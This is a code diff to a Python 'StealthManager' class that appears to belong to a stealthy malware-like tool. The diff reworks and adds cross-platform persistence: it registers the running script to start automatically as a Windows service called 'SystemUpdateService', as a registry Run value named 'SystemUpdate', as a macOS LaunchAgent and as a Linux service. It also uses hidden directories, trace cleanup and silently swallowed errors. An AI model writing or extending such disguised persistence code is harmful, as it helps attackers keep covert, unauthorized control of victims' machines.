@@ -65,9 +65,11 @@ class StealthMode:
             pass
 
 class StealthManager:
-    def __init__(self):
+    def __init__(self, entry_script=None):
         self.system = platform.system()
         self.hidden_dir = self.get_hidden_directory()
+        # Resolve entry script (defaults to current executable/script)
+        self.entry_script = os.path.abspath(entry_script or sys.argv[0])
         
     def get_hidden_directory(self):
         """Get or create hidden directory"""
@@ -140,7 +142,7 @@ class StealthManager:
             service_name = "SystemUpdateService"
             service_display = "System Update Service"
             exe_path = sys.executable
-            script_path = os.path.abspath(__file__)
+            script_path = self.entry_script
             
             # Service installation command
             install_cmd = [
@@ -168,7 +170,7 @@ class StealthManager:
             plist_path = os.path.expanduser(f"~/Library/LaunchAgents/{agent_name}.plist")
             
             exe_path = sys.executable
-            script_path = os.path.abspath(__file__)
+            script_path = self.entry_script
             
             plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -222,7 +224,7 @@ class StealthManager:
                 key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
                 
                 exe_path = sys.executable
-                script_path = os.path.abspath(__file__)
+                script_path = self.entry_script
                 command = f'"{exe_path}" "{script_path}"'
                 
                 winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, command)
@@ -349,5 +351,17 @@ class StealthManager:
         """Disable stealth mode - wrapper for cleanup"""
         try:
             self.cleanup_traces()
+        except Exception:
+            pass
+
+    def configure_autostart(self):
+        """Configure autostart based on current platform"""
+        try:
+            if self.system == 'Windows':
+                self.add_to_windows_startup()
+            elif self.system == 'Darwin':
+                self.install_macos_service()
+            elif self.system == 'Linux':
+                self.install_as_service()
         except Exception:
             pass
